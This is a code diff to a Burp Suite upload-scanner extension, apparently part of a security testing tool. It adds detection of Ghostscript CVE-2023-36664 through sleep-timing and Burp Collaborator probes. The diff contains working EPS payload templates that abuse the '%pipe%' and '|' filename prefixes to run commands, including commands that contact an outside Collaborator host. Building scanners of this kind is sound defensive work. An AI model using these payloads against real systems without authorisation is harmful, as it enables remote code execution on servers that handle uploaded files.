@@ -1908,10 +1908,42 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 )
                 self._send_sleep_based(injector, basename + cmd_name, sleep_content, self.GS_TYPES, injector.opts.sleep_time, issue)
 
+        # Sleep based - CVE-2023-36664 (-dSAFER bypass via pipe filename, Ghostscript <= 10.01.2)
+        name_36664 = "Ghostscript RCE CVE-2023-36664"
+        base_detail_36664 = "A ghostscript file with RCE payload was uploaded exploiting CVE-2023-36664 " \
+                            "(Ghostscript <= 10.01.2, -dSAFER bypass via pipe filename). " \
+                            "See https://nvd.nist.gov/vuln/detail/CVE-2023-36664 for details. "
+        detail_sleep_36664 = "A delay was detected twice when uploading a ghostscript file with a CVE-2023-36664 payload that " \
+                             "executes a sleep like command. Therefore arbitrary command execution seems possible. " \
+                             "The payload used the {} prefix and the payload {}."
+        detail_colab_36664 = "A burp collaborator interaction was detected when uploading a ghostscript file with a CVE-2023-36664 payload that " \
+                             "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. " \
+                             "The payload used the {} prefix and the payload {}. Interactions: <br><br>"
+        basename_36664 = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Gs36664"
+        techniques_36664 = (
+            ("%pipe%", "PipePct", "%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 300 300\n(%pipe%{} {}) (r) file\n"),
+            ("|",      "PipeBar", "%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 300 300\n(|{} {}) (r) file\n"),
+        )
+        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
+            for pipe_prefix, suffix, content_36664 in techniques_36664:
+                details = base_detail_36664 + detail_sleep_36664.format(pipe_prefix, cmd)
+                issue = self._create_issue_template(injector.get_brr(), name_36664, details, confidence, severity)
+                sleep_content = content_36664.format(cmd, str(injector.opts.sleep_time * factor) + args)
+                self._send_sleep_based(injector, basename_36664 + suffix + cmd_name, sleep_content, self.GS_TYPES, injector.opts.sleep_time, issue)
+
         # Burp community edition doesn't have Burp collaborator
         if not burp_colab:
             return []
         colab_tests = []
+
+        # Colab based - CVE-2023-36664
+        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
+            for pipe_prefix, suffix, content_36664 in techniques_36664:
+                details = base_detail_36664 + detail_colab_36664.format(pipe_prefix, cmd)
+                issue = self._create_issue_template(injector.get_brr(), name_36664, details, confidence, severity)
+                attack = content_36664.format(cmd, server)
+                colab_tests.extend(self._send_collaborator(injector, burp_colab, self.GS_TYPES, basename_36664 + suffix + cmd_name,
+                                                           attack, issue, replace=replace, redownload=True))
 
         # Colab based
         for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
